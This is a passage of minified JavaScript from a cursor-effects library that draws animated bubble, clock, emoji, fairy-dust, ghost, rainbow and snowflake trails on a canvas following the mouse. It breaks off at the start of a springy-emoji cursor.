var cursoreffects = function(e) {
    "use strict";
    return e.bubbleCursor = function(e) {
        let t, i, n, o = e && e.element, s = o || document.body, h = window.innerWidth, c = window.innerHeight, l = {
            x: h / 2,
            y: h / 2
        }, r = [], d = [];
        const a = window.matchMedia("(prefers-reduced-motion: reduce)");
        function A() {
            if (a.matches)
                return console.log("This browser has prefers reduced motion turned on, so the cursor did not init"),
                !1;
            t = document.createElement("canvas"),
            i = t.getContext("2d"),
            t.style.top = "0px",
            t.style.left = "0px",
            t.style.pointerEvents = "none",
            o ? (t.style.position = "absolute",
            s.appendChild(t),
            t.width = s.clientWidth,
            t.height = s.clientHeight) : (t.style.position = "fixed",
            document.body.appendChild(t),
            t.width = h,
            t.height = c),
            s.addEventListener("mousemove", g),
            s.addEventListener("touchmove", m, {
                passive: !0
            }),
            s.addEventListener("touchstart", m, {
                passive: !0
            }),
            window.addEventListener("resize", u),
            p()
        }
        function u(e) {
            h = window.innerWidth,
            c = window.innerHeight,
            o ? (t.width = s.clientWidth,
            t.height = s.clientHeight) : (t.width = h,
            t.height = c)
        }
        function m(e) {
            if (e.touches.length > 0)
                for (let t = 0; t < e.touches.length; t++)
                    f(e.touches[t].clientX, e.touches[t].clientY, d[Math.floor(Math.random() * d.length)])
        }
        function g(e) {
            if (o) {
                const t = s.getBoundingClientRect();
                l.x = e.clientX - t.left,
                l.y = e.clientY - t.top
            } else
                l.x = e.clientX,
                l.y = e.clientY;
            f(l.x, l.y)
        }
        function f(e, t, i) {
            r.push(new w(e,t,i))
        }
        function p() {
            !function() {
                if (0 != r.length) {
                    i.clearRect(0, 0, h, c);
                    for (let e = 0; e < r.length; e++)
                        r[e].update(i);
                    for (let e = r.length - 1; e >= 0; e--)
                        r[e].lifeSpan < 0 && r.splice(e, 1);
                    0 == r.length && i.clearRect(0, 0, h, c)
                }
            }(),
            n = requestAnimationFrame(p)
        }
        function y() {
            t.remove(),
            cancelAnimationFrame(n),
            s.removeEventListener("mousemove", g),
            s.removeEventListener("touchmove", m),
            s.removeEventListener("touchstart", m),
            window.addEventListener("resize", u)
        }
        function w(e, t, i) {
            const n = Math.floor(60 * Math.random() + 60);
            this.initialLifeSpan = n,
            this.lifeSpan = n,
            this.velocity = {
                x: (Math.random() < .5 ? -1 : 1) * (Math.random() / 10),
                y: -1 * Math.random() - .4
            },
            this.position = {
                x: e,
                y: t
            },
            this.canv = i,
            this.baseDimension = 4,
            this.update = function(e) {
                this.position.x += this.velocity.x,
                this.position.y += this.velocity.y,
                this.velocity.x += 2 * (Math.random() < .5 ? -1 : 1) / 75,
                this.velocity.y -= Math.random() / 600,
                this.lifeSpan--;
                const t = .2 + (this.initialLifeSpan - this.lifeSpan) / this.initialLifeSpan;
                e.fillStyle = "#e6f1f7",
                e.strokeStyle = "#3a92c5",
                e.beginPath(),
                e.arc(this.position.x - this.baseDimension / 2 * t, this.position.y - this.baseDimension / 2, this.baseDimension * t, 0, 2 * Math.PI),
                e.stroke(),
                e.fill(),
                e.closePath()
            }
        }
        return a.onchange = () => {
            a.matches ? y() : A()
        }
        ,
        A(),
        {
            destroy: y
        }
    }
    ,
    e.clockCursor = function(e) {
        let t, i, n, o = e && e.element, s = o || document.body, h = window.innerWidth, c = window.innerHeight, l = {
            x: h / 2,
            y: h / 2
        };
        const r = e && e.dateColor || "blue"
          , d = e && e.faceColor || "black"
          , a = e && e.secondsColor || "red"
          , A = e && e.minutesColor || "black"
          , u = e && e.hoursColor || "black"
          , m = .4;
        let g = new Date
          , f = g.getDate()
          , p = g.getYear() + 1900;
        const y = (" " + ["SUNDAY", "MONDAY", "TUESDAY", "WEDNESDAY", "THURSDAY", "FRIDAY", "SATURDAY"][g.getDay()] + " " + f + " " + ["JANUARY", "FEBRUARY", "MARCH", "APRIL", "MAY", "JUNE", "JULY", "AUGUST", "SEPTEMBER", "OCTOBER", "NOVEMBER", "DECEMBER"][g.getMonth()] + " " + p).split("")
          , w = ["3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "1", "2"]
          , v = w.length
          , x = ["•", "•", "•"]
          , E = ["•", "•", "•", "•"]
          , C = ["•", "•", "•", "•", "•"]
          , M = 360 / v
          , L = 360 / y.length
          , B = 45 / 6.5
          , b = []
          , R = []
          , Y = []
          , S = []
          , W = []
          , H = []
          , I = []
          , X = []
          , D = [];
        var T = parseInt(y.length + v + x.length + E.length + C.length) + 1;
        const F = window.matchMedia("(prefers-reduced-motion: reduce)");
        function z() {
            if (F.matches)
                return console.log("This browser has prefers reduced motion turned on, so the cursor did not init"),
                !1;
            t = document.createElement("canvas"),
            i = t.getContext("2d"),
            t.style.top = "0px",
            t.style.left = "0px",
            t.style.pointerEvents = "none",
            o ? (t.style.position = "absolute",
            s.appendChild(t),
            t.width = s.clientWidth,
            t.height = s.clientHeight) : (t.style.position = "fixed",
            document.body.appendChild(t),
            t.width = h,
            t.height = c),
            i.font = "10px sans-serif",
            i.textAlign = "center",
            i.textBaseline = "middle";
            for (let e = 0; e < T; e++)
                b[e] = 0,
                R[e] = 0,
                Y[e] = 0,
                S[e] = 0;
            for (let e = 0; e < y.length; e++)
                D[e] = {
                    color: r,
                    value: y[e]
                };
            for (let e = 0; e < w.length; e++)
                X[e] = {
                    color: d,
                    value: w[e]
                };
            for (let e = 0; e < x.length; e++)
                I[e] = {
                    color: u,
                    value: x[e]
                };
            for (let e = 0; e < E.length; e++)
                H[e] = {
                    color: A,
                    value: E[e]
                };
            for (let e = 0; e < C.length; e++)
                W[e] = {
                    color: a,
                    value: C[e]
                };
            s.addEventListener("mousemove", U),
            s.addEventListener("touchmove", J, {
                passive: !0
            }),
            s.addEventListener("touchstart", J, {
                passive: !0
            }),
            window.addEventListener("resize", P),
            Q()
        }
        function P(e) {
            h = window.innerWidth,
            c = window.innerHeight,
            o ? (t.width = s.clientWidth,
            t.height = s.clientHeight) : (t.width = h,
            t.height = c)
        }
        function J(e) {
            if (e.touches.length > 0)
                if (o) {
                    const t = s.getBoundingClientRect();
                    l.x = e.touches[0].clientX - t.left,
                    l.y = e.touches[0].clientY - t.top
                } else
                    l.x = e.touches[0].clientX,
                    l.y = e.touches[0].clientY
        }
        function U(e) {
            if (o) {
                const t = s.getBoundingClientRect();
                l.x = e.clientX - t.left,
                l.y = e.clientY - t.top
            } else
                l.x = e.clientX,
                l.y = e.clientY
        }
        function Q() {
            !function() {
                Y[0] = Math.round(b[0] += (l.y - b[0]) * m),
                S[0] = Math.round(R[0] += (l.x - R[0]) * m);
                for (let e = 1; e < T; e++)
                    Y[e] = Math.round(b[e] += (Y[e - 1] - b[e]) * m),
                    S[e] = Math.round(R[e] += (S[e - 1] - R[e]) * m),
                    b[e - 1] >= c - 80 && (b[e - 1] = c - 80),
                    R[e - 1] >= h - 80 && (R[e - 1] = h - 80)
            }(),
            function() {
                i.clearRect(0, 0, h, c);
                const e = new Date
                  , t = e.getSeconds()
                  , n = Math.PI * (t - 15) / 30
                  , o = e.getMinutes()
                  , s = Math.PI * (o - 15) / 30
                  , l = e.getHours()
                  , r = Math.PI * (l - 3) / 6 + Math.PI * parseInt(e.getMinutes()) / 360;
                for (let e = 0; e < D.length; e++)
                    D[e].y = b[e] + 67.5 * Math.sin(-n + e * L * Math.PI / 180),
                    D[e].x = R[e] + 67.5 * Math.cos(-n + e * L * Math.PI / 180),
                    i.fillStyle = D[e].color,
                    i.fillText(D[e].value, D[e].x, D[e].y);
                for (let e = 0; e < X.length; e++)
                    X[e].y = b[D.length + e] + 45 * Math.sin(e * M * Math.PI / 180),
                    X[e].x = R[D.length + e] + 45 * Math.cos(e * M * Math.PI / 180),
                    i.fillStyle = X[e].color,
                    i.fillText(X[e].value, X[e].x, X[e].y);
                for (let e = 0; e < I.length; e++)
                    I[e].y = b[D.length + v + e] + 0 + e * B * Math.sin(r),
                    I[e].x = R[D.length + v + e] + 0 + e * B * Math.cos(r),
                    i.fillStyle = I[e].color,
                    i.fillText(I[e].value, I[e].x, I[e].y);
                for (let e = 0; e < H.length; e++)
                    H[e].y = b[D.length + v + I.length + e] + 0 + e * B * Math.sin(s),
                    H[e].x = R[D.length + v + I.length + e] + 0 + e * B * Math.cos(s),
                    i.fillStyle = H[e].color,
                    i.fillText(H[e].value, H[e].x, H[e].y);
                for (let e = 0; e < W.length; e++)
                    W[e].y = b[D.length + v + I.length + H.length + e] + 0 + e * B * Math.sin(n),
                    W[e].x = R[D.length + v + I.length + H.length + e] + 0 + e * B * Math.cos(n),
                    i.fillStyle = W[e].color,
                    i.fillText(W[e].value, W[e].x, W[e].y)
            }(),
            n = requestAnimationFrame(Q)
        }
        function Z() {
            t.remove(),
            cancelAnimationFrame(n),
            s.removeEventListener("mousemove", U),
            s.removeEventListener("touchmove", J),
            s.removeEventListener("touchstart", J),
            window.addEventListener("resize", P)
        }
        return F.onchange = () => {
            F.matches ? Z() : z()
        }
        ,
        z(),
        {
            destroy: Z
        }
    }
    ,
    e.emojiCursor = function(e) {
        const t = e && e.emoji || ["😀", "😂", "😆", "😊"];
        let i = e && e.element
          , n = i || document.body
          , o = window.innerWidth
          , s = window.innerHeight;
        const h = {
            x: o / 2,
            y: o / 2
        }
          , c = {
            x: o / 2,
            y: o / 2
        };
        let l = 0;
        const r = []
          , d = [];
        let a, A, u;
        const m = window.matchMedia("(prefers-reduced-motion: reduce)");
        function g() {
            if (m.matches)
                return console.log("This browser has prefers reduced motion turned on, so the cursor did not init"),
                !1;
            a = document.createElement("canvas"),
            A = a.getContext("2d"),
            a.style.top = "0px",
            a.style.left = "0px",
            a.style.pointerEvents = "none",
            i ? (a.style.position = "absolute",
            n.appendChild(a),
            a.width = n.clientWidth,
            a.height = n.clientHeight) : (a.style.position = "fixed",
            document.body.appendChild(a),
            a.width = o,
            a.height = s),
            A.font = "21px serif",
            A.textBaseline = "middle",
            A.textAlign = "center",
            t.forEach((e => {
                let t = A.measureText(e)
                  , i = document.createElement("canvas")
                  , n = i.getContext("2d");
                i.width = t.width,
                i.height = 2 * t.actualBoundingBoxAscent,
                n.textAlign = "center",
                n.font = "21px serif",
                n.textBaseline = "middle",
                n.fillText(e, i.width / 2, t.actualBoundingBoxAscent),
                d.push(i)
            }
            )),
            n.addEventListener("mousemove", y, {
                passive: !0
            }),
            n.addEventListener("touchmove", p, {
                passive: !0
            }),
            n.addEventListener("touchstart", p, {
                passive: !0
            }),
            window.addEventListener("resize", f),
            v()
        }
        function f(e) {
            o = window.innerWidth,
            s = window.innerHeight,
            i ? (a.width = n.clientWidth,
            a.height = n.clientHeight) : (a.width = o,
            a.height = s)
        }
        function p(e) {
            if (e.touches.length > 0)
                for (let t = 0; t < e.touches.length; t++)
                    w(e.touches[t].clientX, e.touches[t].clientY, d[Math.floor(Math.random() * d.length)])
        }
        function y(e) {
            e.timeStamp - l < 16 || window.requestAnimationFrame(( () => {
                if (i) {
                    const t = n.getBoundingClientRect();
                    h.x = e.clientX - t.left,
                    h.y = e.clientY - t.top
                } else
                    h.x = e.clientX,
                    h.y = e.clientY;
                Math.hypot(h.x - c.x, h.y - c.y) > 1 && (w(h.x, h.y, d[Math.floor(Math.random() * t.length)]),
                c.x = h.x,
                c.y = h.y,
                l = e.timeStamp)
            }
            ))
        }
        function w(e, t, i) {
            r.push(new E(e,t,i))
        }
        function v() {
            !function() {
                if (0 != r.length) {
                    A.clearRect(0, 0, o, s);
                    for (let e = 0; e < r.length; e++)
                        r[e].update(A);
                    for (let e = r.length - 1; e >= 0; e--)
                        r[e].lifeSpan < 0 && r.splice(e, 1);
                    0 == r.length && A.clearRect(0, 0, o, s)
                }
            }(),
            u = requestAnimationFrame(v)
        }
        function x() {
            a.remove(),
            cancelAnimationFrame(u),
            n.removeEventListener("mousemove", y),
            n.removeEventListener("touchmove", p),
            n.removeEventListener("touchstart", p),
            window.addEventListener("resize", f)
        }
        function E(e, t, i) {
            const n = Math.floor(60 * Math.random() + 80);
            this.initialLifeSpan = n,
            this.lifeSpan = n,
            this.velocity = {
                x: (Math.random() < .5 ? -1 : 1) * (Math.random() / 2),
                y: .4 * Math.random() + .8
            },
            this.position = {
                x: e,
                y: t
            },
            this.canv = i,
            this.update = function(e) {
                this.position.x += this.velocity.x,
                this.position.y += this.velocity.y,
                this.lifeSpan--,
                this.velocity.y += .05;
                const t = Math.max(this.lifeSpan / this.initialLifeSpan, 0);
                e.drawImage(this.canv, this.position.x - this.canv.width / 2 * t, this.position.y - this.canv.height / 2, this.canv.width * t, this.canv.height * t)
            }
        }
        return m.onchange = () => {
            m.matches ? x() : g()
        }
        ,
        g(),
        {
            destroy: x
        }
    }
    ,
    e.fairyDustCursor = function(e) {
        let t = e && e.colors || ["#D61C59", "#E7D84B", "#1B8798"]
          , i = e && e.element
          , n = i || document.body
          , o = window.innerWidth
          , s = window.innerHeight;
        const h = {
            x: o / 2,
            y: o / 2
        }
          , c = {
            x: o / 2,
            y: o / 2
        }
          , l = []
          , r = [];
        let d, a, A;
        const u = window.matchMedia("(prefers-reduced-motion: reduce)");
        function m() {
            if (u.matches)
                return console.log("This browser has prefers reduced motion turned on, so the cursor did not init"),
                !1;
            d = document.createElement("canvas"),
            a = d.getContext("2d"),
            d.style.top = "0px",
            d.style.left = "0px",
            d.style.pointerEvents = "none",
            i ? (d.style.position = "absolute",
            n.appendChild(d),
            d.width = n.clientWidth,
            d.height = n.clientHeight) : (d.style.position = "fixed",
            n.appendChild(d),
            d.width = o,
            d.height = s),
            a.font = "21px serif",
            a.textBaseline = "middle",
            a.textAlign = "center",
            t.forEach((e => {
                let t = a.measureText("*")
                  , i = document.createElement("canvas")
                  , n = i.getContext("2d");
                i.width = t.width,
                i.height = t.actualBoundingBoxAscent + t.actualBoundingBoxDescent,
                n.fillStyle = e,
                n.textAlign = "center",
                n.font = "21px serif",
                n.textBaseline = "middle",
                n.fillText("*", i.width / 2, t.actualBoundingBoxAscent),
                r.push(i)
            }
            )),
            n.addEventListener("mousemove", p),
            n.addEventListener("touchmove", f, {
                passive: !0
            }),
            n.addEventListener("touchstart", f, {
                passive: !0
            }),
            window.addEventListener("resize", g),
            w()
        }
        function g(e) {
            o = window.innerWidth,
            s = window.innerHeight,
            i ? (d.width = n.clientWidth,
            d.height = n.clientHeight) : (d.width = o,
            d.height = s)
        }
        function f(e) {
            if (e.touches.length > 0)
                for (let t = 0; t < e.touches.length; t++)
                    y(e.touches[t].clientX, e.touches[t].clientY, r[Math.floor(Math.random() * r.length)])
        }
        function p(e) {
            window.requestAnimationFrame(( () => {
                if (i) {
                    const t = n.getBoundingClientRect();
                    h.x = e.clientX - t.left,
                    h.y = e.clientY - t.top
                } else
                    h.x = e.clientX,
                    h.y = e.clientY;
                Math.hypot(h.x - c.x, h.y - c.y) > 1.5 && (y(h.x, h.y, r[Math.floor(Math.random() * t.length)]),
                c.x = h.x,
                c.y = h.y)
            }
            ))
        }
        function y(e, t, i) {
            l.push(new x(e,t,i))
        }
        function w() {
            !function() {
                if (0 != l.length) {
                    a.clearRect(0, 0, o, s);
                    for (let e = 0; e < l.length; e++)
                        l[e].update(a);
                    for (let e = l.length - 1; e >= 0; e--)
                        l[e].lifeSpan < 0 && l.splice(e, 1);
                    0 == l.length && a.clearRect(0, 0, o, s)
                }
            }(),
            A = requestAnimationFrame(w)
        }
        function v() {
            d.remove(),
            cancelAnimationFrame(A),
            n.removeEventListener("mousemove", p),
            n.removeEventListener("touchmove", f),
            n.removeEventListener("touchstart", f),
            window.addEventListener("resize", g)
        }
        function x(e, t, i) {
            const n = Math.floor(30 * Math.random() + 60);
            this.initialLifeSpan = n,
            this.lifeSpan = n,
            this.velocity = {
                x: (Math.random() < .5 ? -1 : 1) * (Math.random() / 2),
                y: .7 * Math.random() + .9
            },
            this.position = {
                x: e,
                y: t
            },
            this.canv = i,
            this.update = function(e) {
                this.position.x += this.velocity.x,
                this.position.y += this.velocity.y,
                this.lifeSpan--,
                this.velocity.y += .02;
                const t = Math.max(this.lifeSpan / this.initialLifeSpan, 0);
                e.drawImage(this.canv, this.position.x - this.canv.width / 2 * t, this.position.y - this.canv.height / 2, this.canv.width * t, this.canv.height * t)
            }
        }
        return u.onchange = () => {
            u.matches ? v() : m()
        }
        ,
        m(),
        {
            destroy: v
        }
    }
    ,
    e.followingDotCursor = function(e) {
        let t, i, n = e && e.element, o = n || document.body, s = window.innerWidth, h = window.innerHeight, c = {
            x: s / 2,
            y: s / 2
        }, l = new function(e, t, i, n) {
            this.position = {
                x: e,
                y: t
            },
            this.width = 10,
            this.lag = 10,
            this.moveTowards = function(e, t, i) {
                this.position.x += (e - this.position.x) / this.lag,
                this.position.y += (t - this.position.y) / this.lag,
                i.fillStyle = r,
                i.beginPath(),
                i.arc(this.position.x, this.position.y, this.width, 0, 2 * Math.PI),
                i.fill(),
                i.closePath()
            }
        }
        (s / 2,h / 2,10,10), r = e?.color || "#323232a6";
        const d = window.matchMedia("(prefers-reduced-motion: reduce)");
        function a() {
            if (d.matches)
                return console.log("This browser has prefers reduced motion turned on, so the cursor did not init"),
                !1;
            t = document.createElement("canvas"),
            i = t.getContext("2d"),
            t.style.top = "0px",
            t.style.left = "0px",
            t.style.pointerEvents = "none",
            n ? (t.style.position = "absolute",
            o.appendChild(t),
            t.width = o.clientWidth,
            t.height = o.clientHeight) : (t.style.position = "fixed",
            document.body.appendChild(t),
            t.width = s,
            t.height = h),
            o.addEventListener("mousemove", u),
            window.addEventListener("resize", A),
            m()
        }
        function A(e) {
            s = window.innerWidth,
            h = window.innerHeight,
            n ? (t.width = o.clientWidth,
            t.height = o.clientHeight) : (t.width = s,
            t.height = h)
        }
        function u(e) {
            if (n) {
                const t = o.getBoundingClientRect();
                c.x = e.clientX - t.left,
                c.y = e.clientY - t.top
            } else
                c.x = e.clientX,
                c.y = e.clientY
        }
        function m() {
            i.clearRect(0, 0, s, h),
            l.moveTowards(c.x, c.y, i),
            requestAnimationFrame(m)
        }
        function g() {
            t.remove(),
            cancelAnimationFrame(m),
            o.removeEventListener("mousemove", u),
            window.addEventListener("resize", A)
        }
        return d.onchange = () => {
            d.matches ? g() : a()
        }
        ,
        a(),
        {
            destroy: g
        }
    }
    ,
    e.ghostCursor = function(e) {
        let t, i, n, o = e && e.element, s = o || document.body, h = e && e.randomDelay, c = e && e.minDelay || 5, l = e && e.maxDelay || 50, r = window.innerWidth, d = window.innerHeight, a = {
            x: r / 2,
            y: r / 2
        }, A = [], u = new Image;
        e && e.image ? u.src = e.image : u.src = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAATCAYAAACk9eypAAAAAXNSR0IArs4c6QAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAhGVYSWZNTQAqAAAACAAFARIAAwAAAAEAAQAAARoABQAAAAEAAABKARsABQAAAAEAAABSASgAAwAAAAEAAgAAh2kABAAAAAEAAABaAAAAAAAAAEgAAAABAAAASAAAAAEAA6ABAAMAAAABAAEAAKACAAQAAAABAAAADKADAAQAAAABAAAAEwAAAAAChpcNAAAACXBIWXMAAAsTAAALEwEAmpwYAAABWWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNS40LjAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyI+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgpMwidZAAABqElEQVQoFY3SPUvDQBgH8BREpRHExYiDgmLFl6WC+AYmWeyLg4i7buJX8DMpOujgyxGvUYeCgzhUQUSKKLUS0+ZyptXh8Z5Ti621ekPyJHl+uftfomhaf9Ei5JyxXKfynyEA6EYcLHpwyflT958GAQ7DTABNHd8EbtDbEH2BD5QEQmi2mM8P/Iq+A0SzszEg+3sPjDnDdVEtQKQbMUidHD3xVzf6A9UDEmEm+8h9KTqTVUjT+vB53aHrCbAPiceYq1dQI1Aqv4EhMll0jzv+Y0yiRgCnLRSYyDQHVoqUXe4uKL9l+L7GXC4vkMhE6eW/AOJs9k583ORDUyXMZ8F5SVHVVnllmPNKSFagAJ5DofaqGXw/gHBYg51dIldkmknY3tguv3jOtHR4+MqAzaraJXbEhqHhcQlwGSOi5pytVQHZLN5s0WNe8HPrLYlFsO20RPHkImxsbmHdLJFI76th7Z4SeuF53hTeFLvhRCJRCTKZKxgdnRDbW+iozFJbBMw14/ElwGYc0egMBMFzT21f5Rog33Z7dX02GBm7WV5ZfT5Nn5bE3zuCDe9UxdTpNvK+5AAAAABJRU5ErkJggg==";
        const m = window.matchMedia("(prefers-reduced-motion: reduce)");
        function g() {
            if (m.matches)
                return console.log("This browser has prefers reduced motion turned on, so the cursor did not init"),
                !1;
            t = document.createElement("canvas"),
            i = t.getContext("2d"),
            t.style.top = "0px",
            t.style.left = "0px",
            t.style.pointerEvents = "none",
            o ? (t.style.position = "absolute",
            s.appendChild(t),
            t.width = s.clientWidth,
            t.height = s.clientHeight) : (t.style.position = "fixed",
            document.body.appendChild(t),
            t.width = r,
            t.height = d),
            s.addEventListener("mousemove", x),
            s.addEventListener("touchmove", p, {
                passive: !0
            }),
            s.addEventListener("touchstart", p, {
                passive: !0
            }),
            window.addEventListener("resize", f),
            C()
        }
        function f(e) {
            r = window.innerWidth,
            d = window.innerHeight,
            o ? (t.width = s.clientWidth,
            t.height = s.clientHeight) : (t.width = r,
            t.height = d)
        }
        function p(e) {
            if (e.touches.length > 0)
                for (let t = 0; t < e.touches.length; t++)
                    E(e.touches[t].clientX, e.touches[t].clientY, u)
        }
        m.onchange = () => {
            m.matches ? M() : g()
        }
        ;
        let y = () => Math.floor(Math.random() * (l - c + 1)) + c
          , w = Date.now()
          , v = y();
        function x(e) {
            if (h) {
                if (w + v > Date.now())
                    return;
                w = Date.now(),
                v = y()
            }
            if (o) {
                const t = s.getBoundingClientRect();
                a.x = e.clientX - t.left,
                a.y = e.clientY - t.top
            } else
                a.x = e.clientX,
                a.y = e.clientY;
            E(a.x, a.y, u)
        }
        function E(e, t, i) {
            A.push(new L(e,t,i))
        }
        function C() {
            !function() {
                if (0 != A.length) {
                    i.clearRect(0, 0, r, d);
                    for (let e = 0; e < A.length; e++)
                        A[e].update(i);
                    for (let e = A.length - 1; e >= 0; e--)
                        A[e].lifeSpan < 0 && A.splice(e, 1);
                    0 == A.length && i.clearRect(0, 0, r, d)
                }
            }(),
            n = requestAnimationFrame(C)
        }
        function M() {
            t.remove(),
            cancelAnimationFrame(n),
            s.removeEventListener("mousemove", x),
            s.removeEventListener("touchmove", p),
            s.removeEventListener("touchstart", p),
            window.addEventListener("resize", f)
        }
        function L(e, t, i) {
            this.initialLifeSpan = 40,
            this.lifeSpan = 40,
            this.position = {
                x: e,
                y: t
            },
            this.image = i,
            this.update = function(e) {
                this.lifeSpan--;
                const t = Math.max(this.lifeSpan / this.initialLifeSpan, 0);
                e.globalAlpha = t,
                e.drawImage(this.image, this.position.x, this.position.y)
            }
        }
        return g(),
        {
            destroy: M
        }
    }
    ,
    e.rainbowCursor = function(e) {
        let t, i, n, o = e && e.element, s = o || document.body, h = window.innerWidth, c = window.innerHeight, l = {
            x: h / 2,
            y: h / 2
        }, r = [];
        const d = e?.length || 20
          , a = e?.colors || ["#FE0000", "#FD8C00", "#FFE500", "#119F0B", "#0644B3", "#C22EDC"]
          , A = e?.size || 3;
        let u = !1;
        const m = window.matchMedia("(prefers-reduced-motion: reduce)");
        function g() {
            if (m.matches)
                return console.log("This browser has prefers reduced motion turned on, so the cursor did not init"),
                !1;
            t = document.createElement("canvas"),
            i = t.getContext("2d"),
            t.style.top = "0px",
            t.style.left = "0px",
            t.style.pointerEvents = "none",
            o ? (t.style.position = "absolute",
            s.appendChild(t),
            t.width = s.clientWidth,
            t.height = s.clientHeight) : (t.style.position = "fixed",
            document.body.appendChild(t),
            t.width = h,
            t.height = c),
            s.addEventListener("mousemove", p),
            window.addEventListener("resize", f),
            y()
        }
        function f(e) {
            h = window.innerWidth,
            c = window.innerHeight,
            o ? (t.width = s.clientWidth,
            t.height = s.clientHeight) : (t.width = h,
            t.height = c)
        }
        function p(e) {
            if (o) {
                const t = s.getBoundingClientRect();
                l.x = e.clientX - t.left,
                l.y = e.clientY - t.top
            } else
                l.x = e.clientX,
                l.y = e.clientY;
            if (!1 === u) {
                u = !0;
                for (let e = 0; e < d; e++)
                    t = l.x,
                    i = l.y,
                    r.push(new v(t,i))
            }
            var t, i
        }
        function y() {
            !function() {
                i.clearRect(0, 0, h, c),
                i.lineJoin = "round";
                let e = []
                  , t = l.x
                  , n = l.y;
                r.forEach((function(i, o, s) {
                    let h = s[o + 1] || s[0];
                    i.position.x = t,
                    i.position.y = n,
                    e.push({
                        x: t,
                        y: n
                    }),
                    t += .4 * (h.position.x - i.position.x),
                    n += .4 * (h.position.y - i.position.y)
                }
                )),
                a.forEach(( (t, n) => {
                    i.beginPath(),
                    i.strokeStyle = t,
                    e.length && i.moveTo(e[0].x, e[0].y + n * (A - 1)),
                    e.forEach(( (e, t) => {
                        0 !== t && i.lineTo(e.x, e.y + n * A)
                    }
                    )),
                    i.lineWidth = A,
                    i.lineCap = "round",
                    i.stroke()
                }
                ))
            }(),
            n = requestAnimationFrame(y)
        }
        function w() {
            t.remove(),
            cancelAnimationFrame(n),
            s.removeEventListener("mousemove", p),
            window.addEventListener("resize", f)
        }
        function v(e, t) {
            this.position = {
                x: e,
                y: t
            }
        }
        return m.onchange = () => {
            m.matches ? w() : g()
        }
        ,
        g(),
        {
            destroy: w
        }
    }
    ,
    e.snowflakeCursor = function(e) {
        let t, i, n, o = e && e.element, s = o || document.body, h = ["❄️"], c = window.innerWidth, l = window.innerHeight, r = {
            x: c / 2,
            y: c / 2
        }, d = [], a = [];
        const A = window.matchMedia("(prefers-reduced-motion: reduce)");
        function u() {
            if (A.matches)
                return console.log("This browser has prefers reduced motion turned on, so the cursor did not init"),
                !1;
            t = document.createElement("canvas"),
            i = t.getContext("2d"),
            t.style.top = "0px",
            t.style.left = "0px",
            t.style.pointerEvents = "none",
            o ? (t.style.position = "absolute",
            s.appendChild(t),
            t.width = s.clientWidth,
            t.height = s.clientHeight) : (t.style.position = "fixed",
            document.body.appendChild(t),
            t.width = c,
            t.height = l),
            i.font = "12px serif",
            i.textBaseline = "middle",
            i.textAlign = "center",
            h.forEach((e => {
                let t = i.measureText(e)
                  , n = document.createElement("canvas")
                  , o = n.getContext("2d");
                n.width = t.width,
                n.height = 2 * t.actualBoundingBoxAscent,
                o.textAlign = "center",
                o.font = "12px serif",
                o.textBaseline = "middle",
                o.fillText(e, n.width / 2, t.actualBoundingBoxAscent),
                a.push(n)
            }
            )),
            s.addEventListener("mousemove", f),
            s.addEventListener("touchmove", g, {
                passive: !0
            }),
            s.addEventListener("touchstart", g, {
                passive: !0
            }),
            window.addEventListener("resize", m),
            y()
        }
        function m(e) {
            c = window.innerWidth,
            l = window.innerHeight,
            o ? (t.width = s.clientWidth,
            t.height = s.clientHeight) : (t.width = c,
            t.height = l)
        }
        function g(e) {
            if (e.touches.length > 0)
                for (let t = 0; t < e.touches.length; t++)
                    p(e.touches[t].clientX, e.touches[t].clientY, a[Math.floor(Math.random() * a.length)])
        }
        function f(e) {
            if (o) {
                const t = s.getBoundingClientRect();
                r.x = e.clientX - t.left,
                r.y = e.clientY - t.top
            } else
                r.x = e.clientX,
                r.y = e.clientY;
            p(r.x, r.y, a[Math.floor(Math.random() * h.length)])
        }
        function p(e, t, i) {
            d.push(new v(e,t,i))
        }
        function y() {
            !function() {
                if (0 != d.length) {
                    i.clearRect(0, 0, c, l);
                    for (let e = 0; e < d.length; e++)
                        d[e].update(i);
                    for (let e = d.length - 1; e >= 0; e--)
                        d[e].lifeSpan < 0 && d.splice(e, 1);
                    0 == d.length && i.clearRect(0, 0, c, l)
                }
            }(),
            n = requestAnimationFrame(y)
        }
        function w() {
            t.remove(),
            cancelAnimationFrame(n),
            s.removeEventListener("mousemove", f),
            s.removeEventListener("touchmove", g),
            s.removeEventListener("touchstart", g),
            window.addEventListener("resize", m)
        }
        function v(e, t, i) {
            const n = Math.floor(60 * Math.random() + 80);
            this.initialLifeSpan = n,
            this.lifeSpan = n,
            this.velocity = {
                x: (Math.random() < .5 ? -1 : 1) * (Math.random() / 2),
                y: 1 + Math.random()
            },
            this.position = {
                x: e,
                y: t
            },
            this.canv = i,
            this.update = function(e) {
                this.position.x += this.velocity.x,
                this.position.y += this.velocity.y,
                this.lifeSpan--,
                this.velocity.x += 2 * (Math.random() < .5 ? -1 : 1) / 75,
                this.velocity.y -= Math.random() / 300;
                const t = Math.max(this.lifeSpan / this.initialLifeSpan, 0)
                  , i = 2 * this.lifeSpan * .0174533;
                e.translate(this.position.x, this.position.y),
                e.rotate(i),
                e.drawImage(this.canv, -this.canv.width / 2 * t, -this.canv.height / 2, this.canv.width * t, this.canv.height * t),
                e.rotate(-i),
                e.translate(-this.position.x, -this.position.y)
            }
        }
        return A.onchange = () => {
            A.matches ? w() : u()
        }
        ,
        u(),
        {
            destroy: w
        }
    }
    ,
    e.springyEmojiCursor = function(e) {
